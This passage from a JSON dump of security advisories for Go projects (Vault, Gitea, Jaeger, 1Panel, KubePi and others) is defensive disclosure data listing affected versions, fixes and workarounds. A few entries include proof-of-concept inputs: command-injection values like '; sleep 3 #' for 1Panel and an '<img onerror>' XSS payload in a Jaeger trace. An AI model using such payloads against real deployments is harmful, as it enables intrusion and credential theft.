[{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.9.0"}, {"fixed": "7.9.6"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.9.5"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.10.0"}, {"fixed": "7.10.4"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.10.3"}}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.8.8"}]}], "database_specific": {"last_known_affected_version_range": "<= 7.8.7"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-4106"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-284", "CWE-862"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-08-11T21:49:05Z", "nvd_published_at": "2023-08-11T07:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-v86x-5fm3-5p7j", "modified": "2023-09-01T17:34:29Z", "published": "2023-08-23T20:42:43Z", "aliases": ["CVE-2023-40577"], "summary": "Alertmanager UI is vulnerable to stored XSS via the /api/v1/alerts endpoint", "details": "### Impact\n\nAn attacker with the permission to perform POST requests on the /api/v1/alerts endpoint could be able to execute arbitrary JavaScript code on the users of Prometheus Alertmanager.\n\n### Patches\n\nUsers can upgrade to Alertmanager v0.2.51.\n\n### Workarounds\n\nUsers can setup a reverse proxy in front of the Alertmanager web server to forbid access to the /api/v1/alerts endpoint.\n\n### References\n\nN/A\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/prometheus/alertmanager"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.25.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.25.0"}}], "references": [{"type": "WEB", "url": "https://github.com/prometheus/alertmanager/security/advisories/GHSA-v86x-5fm3-5p7j"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-40577"}, {"type": "PACKAGE", "url": "https://github.com/prometheus/alertmanager"}, {"type": "WEB", "url": "https://lists.debian.org/debian-lts-announce/2023/10/msg00011.html"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-08-23T20:42:43Z", "nvd_published_at": "2023-08-25T01:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rq5c-hvw6-8pr7", "modified": "2023-08-29T17:35:55Z", "published": "2023-08-29T17:35:55Z", "aliases": ["CVE-2023-39348"], "summary": "Improper log output when using GitHub Status Notifications in spinnaker", "details": "### Impact\nONLY IMPACTS those use GitHub Status Notifications\n\nLog output when updating GitHub status is improperly set to FULL always.  It's recommended to apply the patch and rotate the GitHub token used for github status notifications.  Given that this would output github tokens to a log system, the risk is slightly higher than a \"low\" since token exposure could grant elevated access to repositories outside of control.  If using READ restricted tokens, the exposure is such that the token itself could be used to access resources otherwise restricted from reads.\n\n### Patches\nPatch is in progress.  https://github.com/spinnaker/echo/pull/1316\n\n### Workarounds\nDisable GH Status Notifications.  Filter your logs for Echo log data.  Use read-only tokens that are limited in scope.\n\n### References\nsig-security in slack: https://spinnakerteam.slack.com/archives/CFN8F5UR2\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/spinnaker/spinnaker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}]}], "database_specific": {"last_known_affected_version_range": "< 1.28.8"}}, {"package": {"ecosystem": "Go", "name": "github.com/spinnaker/spinnaker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.29.0"}]}], "database_specific": {"last_known_affected_version_range": "< 1.29.6"}}, {"package": {"ecosystem": "Go", "name": "github.com/spinnaker/spinnaker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.30.0"}]}], "database_specific": {"last_known_affected_version_range": "< 1.30.3"}}, {"package": {"ecosystem": "Go", "name": "github.com/spinnaker/spinnaker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.31.0"}]}], "database_specific": {"last_known_affected_version_range": "< 1.31.1"}}], "references": [{"type": "WEB", "url": "https://github.com/spinnaker/spinnaker/security/advisories/GHSA-rq5c-hvw6-8pr7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-39348"}, {"type": "WEB", "url": "https://github.com/spinnaker/echo/pull/1316"}, {"type": "PACKAGE", "url": "https://github.com/spinnaker/spinnaker"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-08-29T17:35:55Z", "nvd_published_at": "2023-08-28T20:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8j3v-68w3-3848", "modified": "2023-08-09T20:38:27Z", "published": "2023-08-07T15:30:27Z", "aliases": ["CVE-2022-38795"], "summary": "Gitea erroneous repo clones", "details": "In Gitea through 1.17.1, repo cloning can occur in the migration function.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "code.gitea.io/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.17.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-38795"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/20869"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/20892"}, {"type": "WEB", "url": "https://blog.gitea.com/release-of-1.17.2/"}, {"type": "PACKAGE", "url": "https://github.com/go-gitea/gitea"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-08-09T14:40:15Z", "nvd_published_at": "2023-08-07T14:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8x8h-hcq8-jwwx", "modified": "2023-08-31T18:25:08Z", "published": "2023-08-25T18:38:18Z", "aliases": ["CVE-2023-32077"], "summary": "Netmaker has Hardcoded DNS Secret Key", "details": "### Impact \nHardcoded DNS key usage has been found in Netmaker allowing unauth users to interact with DNS API endpoints.\n\n### Patches\nIssue is patched in 0.17.1, and fixed in 0.18.6+. \n\nIf Users are using 0.17.1, they should run \"docker pull gravitl/netmaker:v0.17.1\" and \"docker-compose up -d\". This will switch them to the patched users\n\nIf users are using v0.18.0-0.18.5, they should upgrade to v0.18.6 or later.\n\n### Workarounds\nIf using 0.17.1, can just pull the latest docker image of backend and restart server.\n\n### References\nCredit to Project Discovery, and in particular https://github.com/rootxharsh , https://github.com/iamnoooob, and https://github.com/projectdiscovery\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gravitl/netmaker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.17.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/gravitl/netmaker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.18.0"}, {"fixed": "0.18.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gravitl/netmaker/security/advisories/GHSA-8x8h-hcq8-jwwx"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32077"}, {"type": "WEB", "url": "https://github.com/gravitl/netmaker/pull/2170"}, {"type": "WEB", "url": "https://github.com/gravitl/netmaker/commit/1621c27c1d176b639e9768b2acad7693e387fd51"}, {"type": "WEB", "url": "https://github.com/gravitl/netmaker/commit/9362c39a9a822f0e07361aa7c77af2610597e657"}, {"type": "PACKAGE", "url": "https://github.com/gravitl/netmaker"}], "database_specific": {"cwe_ids": ["CWE-321", "CWE-798"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-08-25T18:38:18Z", "nvd_published_at": "2023-08-24T22:15:08Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wmg5-g953-qqfw", "modified": "2023-07-06T21:51:17Z", "published": "2023-07-06T19:24:11Z", "aliases": ["CVE-2023-24999"], "summary": "Hashicorp Vault Fails to Verify if Approle SecretID Belongs to Role During a Destroy Operation", "details": "When using the Vault and Vault Enterprise (Vault) approle auth method, any authenticated user with access to the `/auth/approle/role/:role_name/secret-id-accessor/destroy` endpoint can destroy the secret ID of any other role by providing the secret ID accessor. This vulnerability, CVE-2023-24999, has been fixed in Vault 1.13.0, 1.12.4, 1.11.8, 1.10.11 and above.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.10.11"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.12.0"}, {"fixed": "1.12.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-24999"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-07-vault-fails-to-verify-if-approle-secretid-belongs-to-role-during-a-destroy-operation/51305"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-06T21:51:17Z", "nvd_published_at": "2023-03-11T00:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4fgv-8448-gf82", "modified": "2023-07-06T21:14:32Z", "published": "2023-07-06T19:24:00Z", "aliases": ["CVE-2022-32171"], "summary": "Zinc Cross-site Scripting vulnerability", "details": "In Zinc, versions v0.1.9 through v0.3.1 are vulnerable to Stored Cross-Site Scripting when using the delete user functionality. When an authenticated user deletes a user having a XSS payload in the user id field, the javascript payload will be executed and allow an attacker to access the user\u2019s credentials.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/zincsearch/zincsearch"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.1.9"}, {"fixed": "0.3.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/zinclabs/zinc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.1.9"}, {"fixed": "0.3.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-32171"}, {"type": "WEB", "url": "https://github.com/zinclabs/zinc/commit/3376c248bade163430f9347742428f0a82cd322d"}, {"type": "WEB", "url": "https://github.com/zincsearch/zincsearch/commit/3376c248bade163430f9347742428f0a82cd322d"}, {"type": "WEB", "url": "https://www.mend.io/vulnerability-database/CVE-2022-32171"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-06T21:13:19Z", "nvd_published_at": "2022-10-06T18:16:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mvj3-qrqh-cjvr", "modified": "2023-07-18T19:15:58Z", "published": "2023-07-05T21:33:48Z", "aliases": ["CVE-2023-34450"], "summary": "CometBFT PeerState JSON serialization deadlock", "details": "### Impact\nAn internal modification to the way struct `PeerState` is serialized to JSON introduced a deadlock when new function MarshallJSON is called. This function can be called from two places:\n\n1. Via logs\n    * Setting the `consensus` logging module to \"debug\" level (should not happen in production), and\n    * Setting the log output format to JSON\n2. Via RPC `dump_consensus_state` \n\nCase 1 above, which should not be hit in production, will eventually hit the deadlock in most goroutines, effectively halting the node.\n\nIn case 2, only the data structures related to the first peer will be deadlocked, together with the thread(s) dealing with the RPC request(s). This means that only one of the channels of communication to the node's peers will be blocked. Eventually the peer will timeout and excluded from the list (typically after 2 minutes). The goroutines involved in the deadlock will not be garbage collected, but they will not interfere with the system after the peer is excluded.\n\nThe theoretical worst case for case 2, is a network with only two validator nodes. In this case, each of the nodes only has one `PeerState` struct. If `dump_consensus_state` is called in either node (or both), the chain will halt until the peer connections time out, after which the nodes will reconnect (with different `PeerState` structs) and the chain will progress again. Then, the same process can be repeated.\n\nAs the number of nodes in a network increases, and thus, the number of peer struct each node maintains, the possibility of reproducing the perturbation visible with 2 nodes decreases. Only the first `PeerState` struct will deadlock, and not the others (RPC `dump_consensus_state` accesses them in a for loop, so the deadlock at the first iteration causes the rest of the iterations of that \"for\" loop to never be reached).\n\nThis regression was introduced in versions `v0.34.28` and `v0.37.1`, and will be fixed in `v0.34.29` and `v0.37.2`.\n\n### Patches\nThe PR containing the fix is [here](https://github.com/cometbft/cometbft/pull/865), and the corresponding issue is [here](https://github.com/cometbft/cometbft/pull/863)\n\n### Workarounds\nFor case 1 (hitting the deadlock via logs)\n* either don't set the log output to \"json\", leave at \"plain\",\n* or don't set the consensus logging module to \"debug\", leave it at \"info\" or higher.\n\nFor case 2 (hitting the deadlock via RPC `dump_consensus_state`)\n* do not expose `dump_consensus_state` RPC endpoint to the public internet (e.g., via rules in your nginx setup)\n\n### References\n\n* [Issue](https://github.com/cometbft/cometbft/pull/863) that introduced the deadlock\n* [Issue](https://github.com/cometbft/cometbft/pull/524) reporting the bug via logs\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cometbft/cometbft"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.34.28"}, {"fixed": "0.34.29"}]}], "versions": ["0.34.28"]}, {"package": {"ecosystem": "Go", "name": "github.com/cometbft/cometbft"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.37.1"}, {"fixed": "0.37.2"}]}], "versions": ["0.37.1"]}], "references": [{"type": "WEB", "url": "https://github.com/cometbft/cometbft/security/advisories/GHSA-mvj3-qrqh-cjvr"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-34450"}, {"type": "WEB", "url": "https://github.com/cometbft/cometbft/pull/524"}, {"type": "WEB", "url": "https://github.com/cometbft/cometbft/pull/863"}, {"type": "WEB", "url": "https://github.com/cometbft/cometbft/pull/865"}, {"type": "PACKAGE", "url": "https://github.com/cometbft/cometbft"}], "database_specific": {"cwe_ids": ["CWE-401", "CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-05T21:33:48Z", "nvd_published_at": "2023-07-03T17:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cf6v-9j57-v6r6", "modified": "2023-07-06T20:43:52Z", "published": "2023-07-05T15:30:25Z", "aliases": ["CVE-2023-3515"], "summary": "code.gitea.io/gitea Open Redirect vulnerability", "details": "Open Redirect in GitHub repository go-gitea/gitea prior to 1.19.4. This is most likely a post-auth redirect plus it is a POST based request scenario, so less likely that can be exploited or chained with other bugs that can cause phishing or credential theft.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "code.gitea.io/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.19.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-3515"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/commit/9aaaf980f0ba15611f30568bd67bce3ec12954e2"}, {"type": "PACKAGE", "url": "https://github.com/go-gitea/gitea"}, {"type": "WEB", "url": "https://huntr.dev/bounties/e335cd18-bc4d-4585-adb7-426c817ed053"}, {"type": "WEB", "url": "https://security.gentoo.org/glsa/202312-13"}], "database_specific": {"cwe_ids": ["CWE-601"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2023-07-06T20:43:52Z", "nvd_published_at": "2023-07-05T15:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p9xf-74xh-mhw5", "modified": "2023-07-27T18:49:02Z", "published": "2023-07-18T19:10:58Z", "aliases": ["CVE-2023-37477"], "summary": "1Panel command injection vulnerability in Firewall ip functionality", "details": "### Summary\nAn OS command injection vulnerability exists in 1Panel firewall functionality. A specially-crafted HTTP request can lead to arbitrary command execution. An attacker can make an authenticated HTTP request to trigger this vulnerability.\n\n### Details\n1Panel firewall functionality `/hosts/firewall/ip` endpoint read user input without validation, the attacker extends the default functionality of the application, which execute system commands.\n\n### PoC\nthe payload `; sleep 3 #` will lead server response in 3 seconds \n![image](https://user-images.githubusercontent.com/4935500/252299676-bc4a8b92-e475-40ee-a92a-fec9fad7a6c3.png)\n\nthe payload `; sleep 6 #` will lead server response in 6 seconds \n![image](https://user-images.githubusercontent.com/4935500/252299871-766cc411-69e5-4c6c-b4ff-7774fa974ea0.png)\n\n### Impact\nAn attacker can execute arbitrary code on the target system, which can lead to a complete compromise of the system.\n\n### Patches\n\nThe vulnerability has been fixed in v1.4.3.\n\n### Workarounds\n\nIt is recommended to upgrade the version to v1.4.3.\n\n### References\n\nIf you have any questions or comments about this advisory:\n\nOpen an issue in https://github.com/1Panel-dev/1Panel\nEmail us at wanghe@fit2cloud.com\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/1Panel-dev/1Panel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 1.4.2"}}], "references": [{"type": "WEB", "url": "https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-p9xf-74xh-mhw5"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37477"}, {"type": "WEB", "url": "https://github.com/1Panel-dev/1Panel/commit/e17b80cff4975ee343568ff526b62319f499005d"}, {"type": "PACKAGE", "url": "https://github.com/1Panel-dev/1Panel"}, {"type": "WEB", "url": "https://github.com/1Panel-dev/1Panel/releases/tag/v1.4.3"}], "database_specific": {"cwe_ids": ["CWE-78"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-18T19:10:58Z", "nvd_published_at": "2023-07-18T19:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2w8w-qhg4-f78j", "modified": "2023-07-11T22:45:37Z", "published": "2023-07-11T22:45:37Z", "aliases": [], "summary": "A stored XSS in jaeger UI might allow an attacker who controls a trace to perform arbitrary jaeger queries", "details": "Related UI vulnerability advisory: https://github.com/jaegertracing/jaeger-ui/security/advisories/GHSA-vv24-rm95-q56r\n\n### Summary\nJaeger UI is using the `json-markup` dependency to display span attributes and resources. This dependency is not sanitising keys of an object though, thus the `KeyValuesTable` is vulnerable to XSS. \n\n### Details\nThe vulnerable line is here: https://github.com/jaegertracing/jaeger-ui/blob/main/packages/jaeger-ui/src/components/TracePage/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L49\n\n### PoC\n\n1. Start a Jaeger UI\n2. Save the following trace as a file:\n```json\n{\n    \"data\": [\n        {\n            \"traceID\": \"076ef819cc06c45a\",\n            \"spans\": [\n                {\n                    \"traceID\": \"076ef819cc06c45a\",\n                    \"spanID\": \"076ef819cc06c45a\",\n                    \"flags\": 1,\n                    \"operationName\": \"and open 'attributes'\",\n                    \"references\": [],\n                    \"startTime\": 1678196149232010,\n                    \"duration\": 13485,\n                    \"tags\": [\n                        {\n                            \"key\": \"sampler.type\",\n                            \"type\": \"string\",\n                            \"value\": \"{\\\"<img src=x onerror=alert(1)>\\\":\\\"test\\\"}\"\n                        }\n                    ],\n                    \"logs\": [],\n                    \"processID\": \"p1\",\n                    \"warnings\": null\n                }\n            ],\n            \"processes\": {\n                \"p1\": {\n                    \"serviceName\": \"click here\",\n                    \"tags\": [\n                    ]\n                }\n            },\n            \"warnings\": null\n        }\n    ],\n    \"total\": 0,\n    \"limit\": 0,\n    \"offset\": 0,\n    \"errors\": null\n}\n```\n3. Upload that trace to Jaeger UI in order to visualise it.\n4. Open the trace, open it's span's attributes.\n5. XSS should be fired.\n\n### Impact\n\nThis is a XSS on Jaeger UI. XSS can be used to run JavaScript.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/jaegertracing/jaeger"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.47.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/jaegertracing/jaeger-ui/security/advisories/GHSA-vv24-rm95-q56r"}, {"type": "WEB", "url": "https://github.com/jaegertracing/jaeger/security/advisories/GHSA-2w8w-qhg4-f78j"}, {"type": "PACKAGE", "url": "https://github.com/jaegertracing/jaeger"}, {"type": "WEB", "url": "https://github.com/jaegertracing/jaeger-ui/blob/main/packages/jaeger-ui/src/components/TracePage/TraceTimelineViewer/SpanDetail/KeyValuesTable.tsx#L49"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-11T22:45:37Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-7j6x-42mm-p7jm", "modified": "2023-07-06T21:14:35Z", "published": "2023-07-06T19:24:00Z", "aliases": ["CVE-2022-32172"], "summary": "Zinc Cross-site Scripting vulnerability", "details": "In Zinc, versions v0.1.9 through v0.3.1 are vulnerable to Stored Cross-Site Scripting when using the delete template functionality. When an authenticated user deletes a template with a XSS payload in the name field, the Javascript payload will be executed and allow an attacker to access the user\u2019s credentials.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/zincsearch/zincsearch"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.1.9"}, {"fixed": "0.3.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/zinclabs/zinc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.1.9"}, {"fixed": "0.3.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-32172"}, {"type": "WEB", "url": "https://github.com/zinclabs/zinc/commit/3376c248bade163430f9347742428f0a82cd322d"}, {"type": "WEB", "url": "https://github.com/zincsearch/zincsearch/commit/3376c248bade163430f9347742428f0a82cd322d"}, {"type": "WEB", "url": "https://www.mend.io/vulnerability-database/CVE-2022-32172"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-06T21:13:15Z", "nvd_published_at": "2022-10-06T18:16:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9mh8-9j64-443f", "modified": "2023-07-06T21:18:06Z", "published": "2023-07-06T19:24:01Z", "aliases": ["CVE-2022-41316"], "summary": "HashiCorp Vault's revocation list not respected", "details": "HashiCorp Vault and Vault Enterprise\u2019s TLS certificate auth method did not initially load the optionally configured CRL issued by the role's CA into memory on startup, resulting in the revocation list not being checked if the CRL has not yet been retrieved. Fixed in 1.12.0, 1.11.4, 1.10.7, and 1.9.10.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.11.0"}, {"fixed": "1.11.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.10.0"}, {"fixed": "1.10.7"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/vault"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.10"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-41316"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-24-vaults-tls-cert-auth-method-only-loaded-crl-after-first-request/45483"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/vault"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-07-06T21:18:06Z", "nvd_published_at": "2022-10-12T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9vrm-v9xv-x3xr", "modified": "2023-07-06T21:47:39Z", "published": "2023-07-06T19:24:09Z", "aliases": ["CVE-2023-0690"], "summary": "HashiCorp Boundary Workers Store Rotated Credentials in Plaintext Even When Key Management Service Configured", "details": "HashiCorp Boundary from 0.10.0 through 0.11.2 contain an issue where when using a PKI-based worker with a Key Management Service (KMS) defined in the configuration file, new credentials created after an automatic rotation may not have been encrypted via the intended KMS. This would result in the credentials being stored in plaintext on the Boundary PKI worker\u2019s disk. This issue is fixed in version 0.12.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/boundary"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.10.0"}, {"fixed": "0.12.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0690"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2023-03-boundary-workers-store-rotated-credentials-in-plaintext-even-when-key-management-service-configured/49907"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/boundary"}], "database_specific": {"cwe_ids": ["CWE-311", "CWE-312"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-06T21:47:39Z", "nvd_published_at": "2023-02-08T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j494-7x2v-vvvp", "modified": "2023-07-14T13:28:34Z", "published": "2023-07-13T17:02:12Z", "aliases": ["CVE-2023-34458"], "summary": "mx-chain-go's relayed transactions always increment nonce", "details": "### Impact\nWhen executing a relayed transaction, if the inner transaction failed, it would have increased the inner transaction's sender account nonce. This could have contributed to a limited DoS attack on a targeted account. The fix is a breaking change so a new flag `RelayedNonceFixEnableEpoch` was needed. This was a strict processing issue while validating blocks on a chain.\n\n### Patches\nv1.4.17 and later versions contain the fix for this issue\n\n### Workarounds\nthere were no workarounds for this issue. The affected account could only wait for the DoS attack to finish as the attack was not free or to attempt to send transactions in a very fast manner so as to compete on the same nonce with the attacker.\n\n### References\nFor the future understanding of this issue, on v1.4.17 and onwards versions, we have this integration test that addresses the issue and tests the fix. \nhttps://github.com/multiversx/mx-chain-go/blob/babdb144f1316ab6176bf3dbd7d4621120414d43/integrationTests/vm/txsFee/relayedMoveBalance_test.go#LL165C14-L165C14\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/multiversx/mx-chain-go"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.4.17"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/multiversx/mx-chain-go/security/advisories/GHSA-j494-7x2v-vvvp"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-34458"}, {"type": "WEB", "url": "https://github.com/multiversx/mx-chain-go/commit/babdb144f1316ab6176bf3dbd7d4621120414d43"}, {"type": "PACKAGE", "url": "https://github.com/multiversx/mx-chain-go"}, {"type": "WEB", "url": "https://github.com/multiversx/mx-chain-go/blob/babdb144f1316ab6176bf3dbd7d4621120414d43/integrationTests/vm/txsFee/relayedMoveBalance_test.go#LL165C14-L165C14"}, {"type": "WEB", "url": "https://github.com/multiversx/mx-chain-go/releases/tag/v1.4.17"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-07-13T17:02:12Z", "nvd_published_at": "2023-07-13T19:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-87f6-8gr7-pc6h", "modified": "2023-07-21T20:18:09Z", "published": "2023-07-21T20:18:09Z", "aliases": ["CVE-2023-37916"], "summary": "KubePi may leak password hash of any user", "details": "### Summary\nhttp://kube.pi/kubepi/api/v1/users/search?pageNum=1&&pageSize=10 leak password of any user (including admin). This leads to password crack attack\n\n\n### 